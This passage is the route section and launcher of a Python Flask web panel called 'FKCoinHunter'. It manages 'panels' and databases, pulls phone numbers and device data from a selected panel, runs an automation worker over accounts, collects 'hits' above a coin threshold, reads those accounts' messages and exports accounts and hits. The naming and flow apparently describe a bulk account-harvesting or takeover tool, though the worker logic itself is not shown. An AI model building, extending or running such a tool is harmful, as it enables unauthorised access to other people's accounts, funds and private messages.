    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 20))
    accounts = account_manager.get_accounts()
    total = len(accounts)
    start = (page - 1) * per_page
    end = start + per_page
    return jsonify({
        'accounts': accounts[start:end],
        'total': total,
        'page': page,
        'per_page': per_page,
        'total_pages': (total + per_page - 1) // per_page
    })

@app.route('/api/hits')
def get_hits():
    return jsonify(account_manager.get_hits())

@app.route('/api/hits/<int:index>')
def get_hit(index):
    hit = account_manager.get_hit(index)
    if hit:
        return jsonify(hit)
    return jsonify({'error': 'Hit not found'}), 404

@app.route('/api/hits/<int:index>/messages')
def get_hit_messages(index):
    messages = account_manager.get_messages_for_hit(index)
    return jsonify(messages)

@app.route('/api/hits/<int:index>/messages/refresh', methods=['POST'])
def refresh_hit_messages(index):
    messages = account_manager.refresh_messages_for_hit(index)
    return jsonify(messages)

@app.route('/api/databases')
def get_databases():
    return jsonify({
        'databases': database_manager.get_databases(),
        'current_index': database_manager.current_panel_index,
        'current_panel': database_manager.get_current_panel().get('name', '') if database_manager.get_current_panel() else '',
        'total': len(database_manager.get_panels())
    })

@app.route('/api/databases/add', methods=['POST'])
def add_databases():
    urls = request.json.get('urls', [])
    if isinstance(urls, str):
        urls = [urls]
    added = database_manager.add_databases(urls)
    return jsonify({'added': added, 'total': len(database_manager.get_databases())})

@app.route('/api/databases/select', methods=['POST'])
def select_database():
    index = request.json.get('index', 0)
    if database_manager.set_current_db(index):
        return jsonify({'success': True})
    return jsonify({'success': False}), 400

@app.route('/api/databases/delete', methods=['POST'])
def delete_database():
    index = request.json.get('index', 0)
    if database_manager.remove_database(index):
        return jsonify({'success': True})
    return jsonify({'success': False}), 400

@app.route('/api/panels/next', methods=['POST'])
def next_panel():
    if database_manager.move_to_next_panel():
        return jsonify({'success': True, 'index': database_manager.current_panel_index})
    return jsonify({'success': False}), 400

@app.route('/api/fetch-devices', methods=['POST'])
def fetch_devices():
    panel = database_manager.get_current_panel()
    if not panel:
        return jsonify({'error': 'No panel selected'}), 400
    
    devices = fetch_phones_from_panel(panel, limit=100)
    return jsonify({
        'devices': [{'phone': phone, 'device': device} for phone, device in devices],
        'count': len(devices),
        'panel': panel.get('name')
    })

@app.route('/api/start', methods=['POST'])
def start_automation():
    if not database_manager.get_current_panel():
        return jsonify({'error': 'No panel selected'}), 400
    worker.set_user(get_user_id())
    worker.start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_automation():
    worker.stop()
    return jsonify({'success': True})

@app.route('/api/export/accounts')
def export_accounts():
    filename = f"accounts_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    try:
        accounts_data = [acc.to_dict() for acc in account_manager.accounts]
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(accounts_data, f, indent=2, ensure_ascii=False)
        return send_file(filename, as_attachment=True)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/export/hits')
def export_hits():
    filename = f"hits_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    try:
        hits = account_manager.get_hits()
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(hits, f, indent=2, ensure_ascii=False)
        return send_file(filename, as_attachment=True)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/clear/logs', methods=['POST'])
def clear_logs():
    auto_status['processing_logs'] = []
    return jsonify({'success': True})

# ============ INITIALIZE ============
account_manager = AccountManager()
database_manager = DatabaseManager()
worker = AutomationWorker(account_manager, database_manager)

# ============ MAIN ============
if __name__ == '__main__':
    print("\n" + "=" * 60)
    print("🦅 FKCoinHunter - Multi-User Web Panel")
    print("=" * 60)
    print(f"HIT Threshold: {HIT_THRESHOLD} FK")
    print(f"Workers: {MAX_WORKERS} concurrent")
    print("🔒 Each user has private data (panels, accounts, hits, logs)")
    print("=" * 60)
    print("\n🌐 Starting web server...")
    print("📱 Open your browser and go to: http://localhost:5000")
    print("=" * 60 + "\n")
    
    def open_browser():
        time.sleep(1)
        webbrowser.open('http://localhost:5000')
    
    threading.Thread(target=open_browser, daemon=True).start()
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False, allow_unsafe_werkzeug=True)
